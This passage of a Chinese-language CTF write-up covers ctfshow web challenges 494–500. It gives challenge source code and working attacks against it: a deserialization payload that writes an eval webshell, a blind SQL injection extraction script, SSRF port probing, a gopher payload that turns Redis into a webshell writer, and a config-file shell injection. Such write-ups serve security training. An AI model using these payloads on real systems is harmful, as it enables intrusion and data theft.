&#125;&#125;</code></pre><p>简单反序列化</p><pre><code class="php">&lt;?phpclass dbLog&#123;    public $sql;    public $content =&#39;&lt;?php @eval($_POST[zf]);?&gt;&#39;;    public $log =&quot;./zf.php&quot;;    public function __destruct()&#123;        file_put_contents($this-&gt;log, $this-&gt;content,FILE_APPEND);    &#125;&#125;$final = new dbLog();echo &#39;;user=&#39;.urlencode(serialize($final));#;user=O%3A5%3A%22dbLog%22%3A3%3A%7Bs%3A3%3A%22sql%22%3BN%3Bs%3A7%3A%22content%22%3Bs%3A26%3A%22%3C%3Fphp+%40eval%28%24_POST%5Bzf%5D%29%3B%3F%3E%22%3Bs%3A3%3A%22log%22%3Bs%3A8%3A%22.%2Fzf.php%22%3B%7D</code></pre><p>这个会写到根目录下面,是网页的根目录,原因是index.php文件调用的file_put_contents()所以以当前目录为基础进行写入</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220411215049150.png" alt="image-20220411215049150"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220411215056027.png" alt="image-20220411215056027"></p><h1 id="web494-495"><a href="#web494-495" class="headerlink" title="web494-495"></a>web494-495</h1><p>index.php</p><pre><code class="php">&lt;?php/*# -*- coding: utf-8 -*- Author: h1xa Date:   2021-03-08 15:43:51 Last Modified by:   h1xa Last Modified time: 2021-03-13 19:59:12 email: h1xa@ctfer.com link: https://ctfer.com*/session_start();include(&#39;render/render_class.php&#39;);include(&#39;render/db_class.php&#39;);$action=$_GET[&#39;action&#39;];if(!isset($action))&#123;    if(isset($_COOKIE[&#39;user&#39;]))&#123;        $c=$_COOKIE[&#39;user&#39;];        if(preg_match(&#39;/\:|\,/&#39;, $c))&#123;            $user=unserialize($c);        &#125;        if($user)&#123;            templateUtil::render(&#39;index&#39;);        &#125;else&#123;            header(&#39;location:index.php?action=login&#39;);        &#125;    &#125;else&#123;        header(&#39;location:index.php?action=login&#39;);    &#125;    die();    &#125;if($action==&#39;check&#39;)&#123;    extract($_GET);    if(!preg_match(&#39;/or|and|innodb|sys/i&#39;, $username))&#123;        $sql = &quot;select username from user where username = &#39;&quot;.$username.&quot;&#39; and password=&#39;&quot;.md5($password).&quot;&#39; order by id limit 1&quot;;        $db=new db();        $user=$db-&gt;select_one_array($sql);    &#125;    if($user)&#123;        setcookie(&#39;user&#39;,$user);        templateUtil::render(&#39;index&#39;,$user);    &#125;else&#123;        templateUtil::render(&#39;error&#39;);    &#125;&#125;if($action==&#39;clear&#39;)&#123;    system(&#39;rm -rf cache/*&#39;);    die(&#39;cache clear&#39;);&#125;if($action==&#39;login&#39;)&#123;    templateUtil::render($action);&#125;else&#123;    templateUtil::render($action);&#125;</code></pre><p>render&#x2F;render_class.php</p><pre><code class="php">&lt;?php/*# -*- coding: utf-8 -*- Author: h1xa Date:   2021-03-08 17:52:18 Last Modified by:   h1xa Last Modified time: 2021-03-13 20:01:31 email: h1xa@ctfer.com link: https://ctfer.com*/include(&#39;file_class.php&#39;);include(&#39;cache_class.php&#39;);class templateUtil &#123;    public static function render($template,$arg=array())&#123;        if(cache::cache_exists($template))&#123;            echo cache::get_cache($template);        &#125;else&#123;            $templateContent=fileUtil::read(&#39;templates/&#39;.$template.&#39;.php&#39;);            $cache=templateUtil::shade($templateContent,$arg);            cache::create_cache($template,$cache);            echo $cache;        &#125;    &#125;    public static  function shade($templateContent,$arg=array())&#123;        foreach ($arg as $key =&gt; $value) &#123;            $templateContent=str_replace(&#39;&#123;&#123;'.$key.'&#125;&#125;&#39;, $value, $templateContent);        &#125;        return $templateContent;    &#125;&#125;</code></pre><p>render&#x2F;db_class.php</p><pre><code class="php">&lt;?php/*# -*- coding: utf-8 -*- Author: h1xa Date:   2021-03-08 20:43:40 Last Modified by:   h1xa Last Modified time: 2021-03-12 17:43:56 email: h1xa@ctfer.com link: https://ctfer.com*/error_reporting(0);class db&#123;        public $db;    public $log;    public $sql;    public $username=&#39;root&#39;;    public $password=&#39;root&#39;;    public $port=&#39;3306&#39;;    public $addr=&#39;127.0.0.1&#39;;    public $database=&#39;ctfshow&#39;;    public function __construct()&#123;        $this-&gt;log=new dbLog();        $this-&gt;db=$this-&gt;getConnection();    &#125;    public function getConnection()&#123;                 return new mysqli($this-&gt;addr,$this-&gt;username,$this-&gt;password,$this-&gt;database);    &#125;    public  function select_one($sql)&#123;        $this-&gt;sql=$sql;        $conn = db::getConnection();        $result=$conn-&gt;query($sql);        if($result)&#123;            return $result-&gt;fetch_object();        &#125;    &#125;    public  function select_one_array($sql)&#123;        $this-&gt;sql=$sql;        $conn = db::getConnection();        $result=$conn-&gt;query($sql);        if($result)&#123;            return $result-&gt;fetch_assoc();        &#125;    &#125;    public function __destruct()&#123;        $this-&gt;log-&gt;log($this-&gt;sql);    &#125;&#125;class dbLog&#123;    public $sql;    public $content;    public $log;    public function __construct()&#123;        $this-&gt;log=&#39;log/&#39;.date_format(date_create(),&quot;Y-m-d&quot;).&#39;.txt&#39;;    &#125;    public function log($sql)&#123;        $this-&gt;content = $this-&gt;content.date_format(date_create(),&quot;Y-m-d-H-i-s&quot;).&#39; &#39;.$sql.&#39; \r\n&#39;;    &#125;    public function __destruct()&#123;        file_put_contents($this-&gt;log, $this-&gt;content,FILE_APPEND);    &#125;&#125;</code></pre><p>file_class.php</p><pre><code class="php">&lt;?php/*# -*- coding: utf-8 -*- Author: h1xa Date:   2021-03-08 17:56:41 Last Modified by:   h1xa Last Modified time: 2021-03-09 14:08:48 email: h1xa@ctfer.com link: https://ctfer.com*/error_reporting(0);class fileUtil&#123;    public static function read($filename)&#123;        return file_get_contents($filename);    &#125;    public static function write($filename,$content,$append =0)&#123;        if($append)&#123;            file_put_contents($filename, $content,FILE_APPEND);        &#125;else&#123;            file_put_contents($filename, $content);        &#125;    &#125;&#125;</code></pre><p>cache_class.php</p><pre><code class="php">&lt;?php/*# -*- coding: utf-8 -*- Author: h1xa Date:   2021-03-08 20:49:18 Last Modified by:   h1xa Last Modified time: 2021-03-13 20:02:23 email: h1xa@ctfer.com link: https://ctfer.com*/class cache&#123;    public static function create_cache($template,$content)&#123;        if(file_exists(&#39;cache/&#39;.md5($template).&#39;.html&#39;))&#123;            return true;        &#125;else&#123;            fileUtil::write(&#39;cache/&#39;.md5($template).&#39;.html&#39;,$content);        &#125;    &#125;    public static function get_cache($template)&#123;        return fileUtil::read(&#39;cache/&#39;.md5($template).&#39;.html&#39;);    &#125;    public static function cache_exists($template)&#123;        return file_exists(&#39;cache/&#39;.md5($template).&#39;.html&#39;);    &#125;&#125;</code></pre><p>为啥没变化,上一题脚本直接过.发现flag没有,可以直接通过蚁剑连接数据库,毕竟我们已经知道用户名和密码了</p><p>要填127.0.0.1哦</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220411223652378.png" alt="image-20220411223652378"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220411223730608.png" alt="image-20220411223730608"></p><h1 id="web496"><a href="#web496" class="headerlink" title="web496"></a>web496</h1><p>index.php</p><pre><code class="php">&lt;?php/*# -*- coding: utf-8 -*- Author: h1xa Date:   2021-03-08 15:43:51 Last Modified by:   h1xa Last Modified time: 2021-03-15 05:42:14 email: h1xa@ctfer.com link: https://ctfer.com*/session_start();include(&#39;render/render_class.php&#39;);include(&#39;render/db_class.php&#39;);$action=$_GET[&#39;action&#39;];if(!isset($action))&#123;    if(isset($_COOKIE[&#39;user&#39;]))&#123;        $c=$_COOKIE[&#39;user&#39;];        if(preg_match(&#39;/\:|\,/&#39;, $c))&#123;            #$user=unserialize($c);        &#125;        if($user)&#123;            templateUtil::render(&#39;index&#39;);        &#125;else&#123;            header(&#39;location:index.php?action=login&#39;);        &#125;    &#125;else&#123;        header(&#39;location:index.php?action=login&#39;);    &#125;    die();    &#125;switch ($action) &#123;    case &#39;check&#39;:        $username=$_POST[&#39;username&#39;];        $password=$_POST[&#39;password&#39;];        if(!preg_match(&#39;/or|file|innodb|sys|mysql/i&#39;, $username))&#123;            $sql = &quot;select username,nickname from user where username = &#39;&quot;.$username.&quot;&#39; and password=&#39;&quot;.md5($password).&quot;&#39; order by id limit 1&quot;;            $db=new db();            $user=$db-&gt;select_one_array($sql);        &#125;        if($user)&#123;            $_SESSION[&#39;user&#39;]=$user;            header(&#39;location:index.php?action=index&#39;);        &#125;else&#123;            templateUtil::render(&#39;error&#39;);        &#125;        break;    case &#39;clear&#39;:        system(&#39;rm -rf cache/*&#39;);        die(&#39;cache clear&#39;);        break;    case &#39;login&#39;:        templateUtil::render($action);        break;    case &#39;index&#39;:        $user=$_SESSION[&#39;user&#39;];        if($user)&#123;            templateUtil::render(&#39;index&#39;,$user);        &#125;else&#123;            header(&#39;location:index.php?action=login&#39;);        &#125;        break;    case &#39;view&#39;:        $user=$_SESSION[&#39;user&#39;];        if($user)&#123;            templateUtil::render($_GET[&#39;page&#39;],$user);        &#125;else&#123;            header(&#39;location:index.php?action=login&#39;);        &#125;        break;    case &#39;logout&#39;:        session_destroy();        header(&#39;location:index.php?action=login&#39;);        break;    default:        templateUtil::render($action);        break;&#125;</code></pre><p>render&#x2F;render_class.php</p><pre><code class="php">&lt;?php/*# -*- coding: utf-8 -*- Author: h1xa Date:   2021-03-08 17:52:18 Last Modified by:   h1xa Last Modified time: 2021-03-14 09:23:59 email: h1xa@ctfer.com link: https://ctfer.com*/include(&#39;file_class.php&#39;);include(&#39;cache_class.php&#39;);class templateUtil &#123;    public static function render($template,$arg=array())&#123;        $templateContent=fileUtil::read(&#39;templates/&#39;.$template.&#39;.php&#39;);        $cache=templateUtil::shade($templateContent,$arg);        echo $cache;    &#125;    public static  function shade($templateContent,$arg=array())&#123;        foreach ($arg as $key =&gt; $value) &#123;            $templateContent=str_replace(&#39;&#123;&#123;'.$key.'&#125;&#125;&#39;, $value, $templateContent);        &#125;        return $templateContent;    &#125;&#125;</code></pre><p>render&#x2F;db_class.php</p><pre><code class="php">&lt;?php/*# -*- coding: utf-8 -*- Author: h1xa Date:   2021-03-08 20:43:40 Last Modified by:   h1xa Last Modified time: 2021-03-15 05:02:27 email: h1xa@ctfer.com link: https://ctfer.com*/error_reporting(0);class db&#123;        public $db;    public $log;    public $sql;    public $username=&#39;root&#39;;    public $password=&#39;root&#39;;    public $port=&#39;3306&#39;;    public $addr=&#39;127.0.0.1&#39;;    public $database=&#39;ctfshow&#39;;    public function __construct()&#123;        $this-&gt;log=new dbLog();        $this-&gt;db=$this-&gt;getConnection();    &#125;    public function getConnection()&#123;                 return new mysqli($this-&gt;addr,$this-&gt;username,$this-&gt;password,$this-&gt;database);    &#125;    public  function select_one($sql)&#123;        $this-&gt;sql=$sql;        $result=$this-&gt;db-&gt;query($sql);        if($result)&#123;            return $result-&gt;fetch_object();        &#125;    &#125;    public  function select_one_array($sql)&#123;        $this-&gt;sql=$sql;        $conn = db::getConnection();        $result=$this-&gt;db-&gt;query($sql);        if($result)&#123;            return $result-&gt;fetch_assoc();        &#125;    &#125;    public function update_one($sql)&#123;        $this-&gt;sql=$sql;        $conn = db::getConnection();        $this-&gt;db-&gt;query($sql);        return $this-&gt;db-&gt;affected_rows;    &#125;    public function __destruct()&#123;        $this-&gt;log-&gt;log($this-&gt;sql);    &#125;&#125;class dbLog&#123;    public $sql;    public $content;    public $log;    public function __construct()&#123;        $this-&gt;log=&#39;log/&#39;.date_format(date_create(),&quot;Y-m-d&quot;).&#39;.txt&#39;;    &#125;    public function log($sql)&#123;        $this-&gt;content = $this-&gt;content.date_format(date_create(),&quot;Y-m-d-H-i-s&quot;).&#39; &#39;.$sql.&#39; \r\n&#39;;    &#125;    public function __destruct()&#123;        file_put_contents($this-&gt;log, $this-&gt;content,FILE_APPEND);    &#125;&#125;</code></pre><p>file_class.php</p><pre><code class="php">&lt;?php/*# -*- coding: utf-8 -*- Author: h1xa Date:   2021-03-08 17:56:41 Last Modified by:   h1xa Last Modified time: 2021-03-09 14:08:48 email: h1xa@ctfer.com link: https://ctfer.com*/error_reporting(0);class fileUtil&#123;    public static function read($filename)&#123;        return file_get_contents($filename);    &#125;    public static function write($filename,$content,$append =0)&#123;        if($append)&#123;            file_put_contents($filename, $content,FILE_APPEND);        &#125;else&#123;            file_put_contents($filename, $content);        &#125;    &#125;&#125;</code></pre><p>cache_class.php</p><pre><code class="php">&lt;?php/*# -*- coding: utf-8 -*- Author: h1xa Date:   2021-03-08 20:49:18 Last Modified by:   h1xa Last Modified time: 2021-03-13 20:02:23 email: h1xa@ctfer.com link: https://ctfer.com*/class cache&#123;    public static function create_cache($template,$content)&#123;        if(file_exists(&#39;cache/&#39;.md5($template).&#39;.html&#39;))&#123;            return true;        &#125;else&#123;            fileUtil::write(&#39;cache/&#39;.md5($template).&#39;.html&#39;,$content);        &#125;    &#125;    public static function get_cache($template)&#123;        return fileUtil::read(&#39;cache/&#39;.md5($template).&#39;.html&#39;);    &#125;    public static function cache_exists($template)&#123;        return file_exists(&#39;cache/&#39;.md5($template).&#39;.html&#39;);    &#125;&#125;</code></pre><p>这次发现登录之后会进入index页面,我们这里直接进行登录</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220413182606641.png" alt="image-20220413182606641"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220413182616097.png" alt="image-20220413182616097"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220413182939258.png" alt="image-20220413182939258"></p><p>发现也就一个view有用</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220413183106690.png" alt="image-20220413183106690"></p><p>又搜到一个.php文件</p><p>admin_edit.php</p><pre><code class="php">&lt;?php/*# -*- coding: utf-8 -*- Author: h1xa Date:   2021-03-15 04:27:41 Last Modified by:   h1xa Last Modified time: 2021-03-15 05:36:01 email: h1xa@ctfer.com link: https://ctfer.com*/session_start();include(&#39;../render/db_class.php&#39;);error_reporting(0);$user= $_SESSION[&#39;user&#39;];$ret = array(        &quot;code&quot;=&gt;0,        &quot;msg&quot;=&gt;&quot;查询失败&quot;,        &quot;count&quot;=&gt;0,        &quot;data&quot;=&gt;array()    );if($user)&#123;    extract($_POST);    $sql = &quot;update user set nickname=&#39;&quot;.substr($nickname, 0,8).&quot;&#39; where username=&#39;&quot;.$user[&#39;username&#39;].&quot;&#39;&quot;;    $db=new db();    if($db-&gt;update_one($sql))&#123;        $_SESSION[&#39;user&#39;][&#39;nickname&#39;]=$nickname;        $ret[&#39;msg&#39;]=&#39;管理员信息修改成功&#39;;    &#125;else&#123;        $ret[&#39;msg&#39;]=&#39;管理员信息修改失败&#39;;    &#125;    die(json_encode($ret));&#125;else&#123;    $ret[&#39;msg&#39;]=&#39;请登录后使用此功能&#39;;    die(json_encode($ret));&#125;</code></pre><pre><code class="php">import randomimport requestsurl = &quot;http://3e4559fb-80d2-422f-bc45-181f5d5a6d3c.challenge.ctf.show/api/admin_edit.php&quot;login = &quot;http://3e4559fb-80d2-422f-bc45-181f5d5a6d3c.challenge.ctf.show/index.php?action=check&quot;data = &#123;    &quot;username&quot; :&quot;1&#39;||1=1#&quot;,    &quot;password&quot;:&#39;1&#39;,    &#39;action&#39;:&#39;check&#39;&#125;session = requests.session()session.post(login,data=data,proxies=&#123;&quot;http&quot;:&quot;http://127.0.0.1:8081&quot;&#125;)payload = &quot;if(ascii(substr((select database()),1,1))=0,1,0)&quot; #错误payload = &quot;if(ascii(substr((select database()),1,1))&gt;0,1,0)&quot; #正确date = &#123;    &quot;user[username]&quot;: f&quot;1&#39; or &#123;payload&#125;#&quot;,    &#39;nickname&#39;: f&quot;&#123;random.randint(1,10000)&#125;&quot;&#125;r = session.post(url, data=date)print(r.json())</code></pre><pre><code class="php">import randomimport requestsurl = &quot;http://3e4559fb-80d2-422f-bc45-181f5d5a6d3c.challenge.ctf.show/api/admin_edit.php&quot;login = &quot;http://3e4559fb-80d2-422f-bc45-181f5d5a6d3c.challenge.ctf.show/index.php?action=check&quot;data = &#123;    &quot;username&quot; :&quot;1&#39;||1=1#&quot;,    &quot;password&quot;:&#39;1&#39;,    &#39;action&#39;:&#39;check&#39;&#125;session = requests.session()session.post(login,data=data,proxies=&#123;&quot;http&quot;:&quot;http://127.0.0.1:8081&quot;&#125;)result =&quot;&quot;i = 0while 1:    i = i + 1    head = 32    tail = 127    while head &lt; tail:        mid = (head + tail) &gt;&gt; 1        # 查数据库  flagyoudontknow76        #payload = &quot;select group_concat(table_name) from information_schema.tables where table_schema=database()&quot;        # 查表名        #payload = &quot;select group_concat(column_name) from information_schema.columns where table_name=&#39;flagyoudontknow76&#39;&quot;        # 查数据        payload = &quot;select flagisherebutyouneverknow118 from flagyoudontknow76&quot;        date = &#123;            &quot;user[username]&quot;: f&quot;1&#39; or if(ascii(substr((&#123;payload&#125;),&#123;i&#125;,1))&gt;&#123;mid&#125;,1,0)#&quot;,            &#39;nickname&#39;: f&quot;&#123;random.randint(1,100000)&#125;&quot;        &#125;        r = session.post(url, data=date)        #print(r.json())        if &quot;管理员信息修改成功&quot; == r.json()[&#39;msg&#39;]:            head = mid + 1        else:            tail = mid    if head != 32:        result += chr(head)    else:        break    print(result)</code></pre><h1 id="web497"><a href="#web497" class="headerlink" title="web497"></a>web497</h1><p>index.php</p><pre><code class="php">&lt;?php/*# -*- coding: utf-8 -*- Author: h1xa Date:   2021-03-08 15:43:51 Last Modified by:   h1xa Last Modified time: 2021-03-15 07:34:08 email: h1xa@ctfer.com link: https://ctfer.com*/session_start();include(&#39;render/render_class.php&#39;);include(&#39;render/db_class.php&#39;);$action=$_GET[&#39;action&#39;];if(!isset($action))&#123;    if(isset($_COOKIE[&#39;user&#39;]))&#123;        $c=$_COOKIE[&#39;user&#39;];        if(!preg_match(&#39;/\:|\,/&#39;, $c))&#123;            $user=unserialize($c);        &#125;        if($user)&#123;            templateUtil::render(&#39;index&#39;);        &#125;else&#123;            header(&#39;location:index.php?action=login&#39;);        &#125;    &#125;else&#123;        header(&#39;location:index.php?action=login&#39;);    &#125;    die();    &#125;switch ($action) &#123;    case &#39;check&#39;:        $username=$_POST[&#39;username&#39;];        $password=$_POST[&#39;password&#39;];        if(!preg_match(&#39;/file|or|innodb|sys|mysql/i&#39;, $username))&#123;            $sql = &quot;select username,nickname,avatar from user where username = &#39;&quot;.$username.&quot;&#39; and password=&#39;&quot;.md5($password).&quot;&#39; order by id limit 1&quot;;            $db=new db();            $user=$db-&gt;select_one_array($sql);        &#125;        if($user)&#123;            $_SESSION[&#39;user&#39;]=$user;            header(&#39;location:index.php?action=index&#39;);        &#125;else&#123;            templateUtil::render(&#39;error&#39;);        &#125;        break;    case &#39;clear&#39;:        system(&#39;rm -rf cache/*&#39;);        die(&#39;cache clear&#39;);        break;    case &#39;login&#39;:        templateUtil::render($action);        break;    case &#39;index&#39;:        $user=$_SESSION[&#39;user&#39;];        if($user)&#123;            templateUtil::render(&#39;index&#39;,$user);        &#125;else&#123;            header(&#39;location:index.php?action=login&#39;);        &#125;        break;    case &#39;view&#39;:        $user=$_SESSION[&#39;user&#39;];        if($user)&#123;            templateUtil::render($_GET[&#39;page&#39;],$user);        &#125;else&#123;            header(&#39;location:index.php?action=login&#39;);        &#125;        break;    case &#39;logout&#39;:        session_destroy();        header(&#39;location:index.php?action=login&#39;);        break;    default:        templateUtil::render($action);        break;&#125;</code></pre><p>render&#x2F;db_class.php</p><pre><code class="php">&lt;?php/*# -*- coding: utf-8 -*- Author: h1xa Date:   2021-03-08 20:43:40 Last Modified by:   h1xa Last Modified time: 2021-03-15 05:02:27 email: h1xa@ctfer.com link: https://ctfer.com*/error_reporting(0);class db&#123;        public $db;    public $log;    public $sql;    public $username=&#39;root&#39;;    public $password=&#39;root&#39;;    public $port=&#39;3306&#39;;    public $addr=&#39;127.0.0.1&#39;;    public $database=&#39;ctfshow&#39;;    public function __construct()&#123;        $this-&gt;log=new dbLog();        $this-&gt;db=$this-&gt;getConnection();    &#125;    public function getConnection()&#123;                 return new mysqli($this-&gt;addr,$this-&gt;username,$this-&gt;password,$this-&gt;database);    &#125;    public  function select_one($sql)&#123;        $this-&gt;sql=$sql;        $result=$this-&gt;db-&gt;query($sql);        if($result)&#123;            return $result-&gt;fetch_object();        &#125;    &#125;    public  function select_one_array($sql)&#123;        $this-&gt;sql=$sql;        $conn = db::getConnection();        $result=$this-&gt;db-&gt;query($sql);        if($result)&#123;            return $result-&gt;fetch_assoc();        &#125;    &#125;    public function update_one($sql)&#123;        $this-&gt;sql=$sql;        $conn = db::getConnection();        $this-&gt;db-&gt;query($sql);        return $this-&gt;db-&gt;affected_rows;    &#125;    public function __destruct()&#123;        $this-&gt;log-&gt;log($this-&gt;sql);    &#125;&#125;class dbLog&#123;    public $sql;    public $content;    public $log;    public function __construct()&#123;        $this-&gt;log=&#39;log/&#39;.date_format(date_create(),&quot;Y-m-d&quot;).&#39;.txt&#39;;    &#125;    public function log($sql)&#123;        $this-&gt;content = $this-&gt;content.date_format(date_create(),&quot;Y-m-d-H-i-s&quot;).&#39; &#39;.$sql.&#39; \r\n&#39;;    &#125;    public function __destruct()&#123;        file_put_contents($this-&gt;log, $this-&gt;content,FILE_APPEND);    &#125;&#125;</code></pre><p>render&#x2F;render_class.php</p><pre><code class="php">&lt;?php/*# -*- coding: utf-8 -*- Author: h1xa Date:   2021-03-08 17:52:18 Last Modified by:   h1xa Last Modified time: 2021-03-15 08:40:19 email: h1xa@ctfer.com link: https://ctfer.com*/include(&#39;file_class.php&#39;);include(&#39;cache_class.php&#39;);class templateUtil &#123;    public static function render($template,$arg=array())&#123;        $templateContent=fileUtil::read(&#39;templates/&#39;.$template.&#39;.php&#39;);        $cache=templateUtil::shade($templateContent,$arg);        echo $cache;    &#125;    public static  function shade($templateContent,$arg=array())&#123;        $templateContent=templateUtil::checkImage($templateContent,$arg);        foreach ($arg as $key =&gt; $value) &#123;            $templateContent=str_replace(&#39;&#123;&#123;'.$key.'&#125;&#125;&#39;, $value, $templateContent);        &#125;        return $templateContent;    &#125;    public static function checkImage($templateContent,$arg=array())&#123;        foreach ($arg as $key =&gt; $value) &#123;            if(stripos($templateContent, &#39;&#123;&#123;img:'.$key.'&#125;&#125;&#39;))&#123;                $encode=&#39;&#39;;                if(file_exists(__DIR__.&#39;/../cache/&#39;.md5($value)))&#123;                    $encode=file_get_contents(__DIR__.&#39;/../cache/&#39;.md5($value));                &#125;else&#123;                    $ch=curl_init($value);                    curl_setopt($ch, CURLOPT_HEADER, 0);                    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);                    $result=curl_exec($ch);                    curl_close($ch);                    $ret=chunk_split(base64_encode($result));                    $encode = &#39;data:image/jpg/png/gif;base64,&#39; . $ret;                    file_put_contents(__DIR__.&#39;/../cache/&#39;.md5($value), $encode);                &#125;                $templateContent=str_replace(&#39;&#123;&#123;img:'.$key.'&#125;&#125;&#39;, $encode, $templateContent);            &#125;                    &#125;        return $templateContent;    &#125;&#125;</code></pre><p>file_class.php</p><pre><code class="php">&lt;?php/*# -*- coding: utf-8 -*- Author: h1xa Date:   2021-03-08 17:56:41 Last Modified by:   h1xa Last Modified time: 2021-03-09 14:08:48 email: h1xa@ctfer.com link: https://ctfer.com*/error_reporting(0);class fileUtil&#123;    public static function read($filename)&#123;        return file_get_contents($filename);    &#125;    public static function write($filename,$content,$append =0)&#123;        if($append)&#123;            file_put_contents($filename, $content,FILE_APPEND);        &#125;else&#123;            file_put_contents($filename, $content);        &#125;    &#125;&#125;</code></pre><p>cache_class.php</p><pre><code class="php">&lt;?php/*# -*- coding: utf-8 -*- Author: h1xa Date:   2021-03-08 20:49:18 Last Modified by:   h1xa Last Modified time: 2021-03-13 20:02:23 email: h1xa@ctfer.com link: https://ctfer.com*/class cache&#123;    public static function create_cache($template,$content)&#123;        if(file_exists(&#39;cache/&#39;.md5($template).&#39;.html&#39;))&#123;            return true;        &#125;else&#123;            fileUtil::write(&#39;cache/&#39;.md5($template).&#39;.html&#39;,$content);        &#125;    &#125;    public static function get_cache($template)&#123;        return fileUtil::read(&#39;cache/&#39;.md5($template).&#39;.html&#39;);    &#125;    public static function cache_exists($template)&#123;        return file_exists(&#39;cache/&#39;.md5($template).&#39;.html&#39;);    &#125;&#125;</code></pre><p>api&#x2F;admin_edit.php</p><pre><code class="php">&lt;?php/*# -*- coding: utf-8 -*- Author: h1xa Date:   2021-03-15 04:27:41 Last Modified by:   h1xa Last Modified time: 2021-03-15 07:45:25 email: h1xa@ctfer.com link: https://ctfer.com*/session_start();include(&#39;../render/db_class.php&#39;);error_reporting(0);$user= $_SESSION[&#39;user&#39;];$ret = array(        &quot;code&quot;=&gt;0,        &quot;msg&quot;=&gt;&quot;查询失败&quot;,        &quot;count&quot;=&gt;0,        &quot;data&quot;=&gt;array()    );if($user)&#123;    extract($_POST);    $user= $_SESSION[&#39;user&#39;];    if(preg_match(&#39;/\&#39;|\&quot;|\\\/&#39;, $avatar))&#123;        $ret[&#39;msg&#39;]=&#39;存在无效字符&#39;;        die(json_encode($ret));    &#125;    $sql = &quot;update user set nickname=&#39;&quot;.substr($nickname, 0,8).&quot;&#39;,avatar=&#39;&quot;.$avatar.&quot;&#39; where username=&#39;&quot;.substr($user[&#39;username&#39;],0,8).&quot;&#39;&quot;;    $db=new db();    if($db-&gt;update_one($sql))&#123;        $_SESSION[&#39;user&#39;][&#39;nickname&#39;]=$nickname;        $_SESSION[&#39;user&#39;][&#39;avatar&#39;]=$avatar;        $ret[&#39;msg&#39;]=&#39;管理员信息修改成功&#39;;    &#125;else&#123;        $ret[&#39;msg&#39;]=&#39;管理员信息修改失败&#39;;    &#125;    die(json_encode($ret));&#125;else&#123;    $ret[&#39;msg&#39;]=&#39;请登录后使用此功能&#39;;    die(json_encode($ret));&#125;</code></pre><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220413201803657.png" alt="image-20220413201803657"></p><p>找到一个修改头像,试试ssrf</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220413201900968.png" alt="image-20220413201900968"></p><p>使用file协议读取文件</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220413203537687.png" alt="image-20220413203537687"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220413203611392.png" alt="image-20220413203611392"></p><h1 id="web498"><a href="#web498" class="headerlink" title="web498"></a>web498</h1><p>这次发现flag文件读不成了,但是ssrf还在</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220413204553495.png" alt="image-20220413204553495"></p><p>我们使用</p><pre><code class="php">dict://127.0.0.1:80</code></pre><p>来探测一下本地端口</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220413205251454.png" alt="image-20220413205251454"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220413205320503.png" alt="image-20220413205320503"></p><p>发现6379端口开着,试试ssrf打无密码redis</p><pre><code class="php">gopherus --exploit redisphp&lt;?php eval($_POST[&#39;zf&#39;]);?&gt;</code></pre><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220413205531082.png" alt="image-20220413205531082"></p><pre><code class="php">gopher://127.0.0.1:6379/_%2A1%0D%0A%248%0D%0Aflushall%0D%0A%2A3%0D%0A%243%0D%0Aset%0D%0A%241%0D%0A1%0D%0A%2431%0D%0A%0A%0A%3C%3Fphp%20eval%28%24_POST%5B%27zf%27%5D%29%3B%3F%3E%0A%0A%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%243%0D%0Adir%0D%0A%2413%0D%0A/var/www/html%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%2410%0D%0Adbfilename%0D%0A%249%0D%0Ashell.php%0D%0A%2A1%0D%0A%244%0D%0Asave%0D%0A%0A</code></pre><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220413210540856.png" alt="image-20220413210540856"></p><h1 id="web499"><a href="#web499" class="headerlink" title="web499"></a>web499</h1><p>这次多了一个settings.php</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220413210943926.png" alt="image-20220413210943926"></p><pre><code class="php">&lt;?php/*# -*- coding: utf-8 -*- Author: h1xa Date:   2021-03-16 15:50:14 Last Modified by:   h1xa Last Modified time: 2021-03-16 16:03:19 email: h1xa@ctfer.com link: https://ctfer.com*/session_start();error_reporting(0);$user= $_SESSION[&#39;user&#39;];$ret = array(        &quot;code&quot;=&gt;0,        &quot;msg&quot;=&gt;&quot;查询失败&quot;,        &quot;count&quot;=&gt;0,        &quot;data&quot;=&gt;array()    );if($user)&#123;    $config = unserialize(file_get_contents(__DIR__.&#39;/../config/settings.php&#39;));    foreach ($_POST as $key =&gt; $value) &#123;        $config[$key]=$value;    &#125;    file_put_contents(__DIR__.&#39;/../config/settings.php&#39;, serialize($config));    $ret[&#39;msg&#39;]=&#39;管理员信息修改成功&#39;;    die(json_encode($ret));&#125;else&#123;    $ret[&#39;msg&#39;]=&#39;请登录后使用此功能&#39;;    die(json_encode($ret));&#125;</code></pre><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220413212004560.png" alt="image-20220413212004560"></p><p>简单写个一句话,写到了’_<em>DIR</em>_.’&#x2F;..&#x2F;config&#x2F;settings.php</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220413212112902.png" alt="image-20220413212112902"></p><h1 id="web500"><a href="#web500" class="headerlink" title="web500"></a>web500</h1><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220413212450700.png" 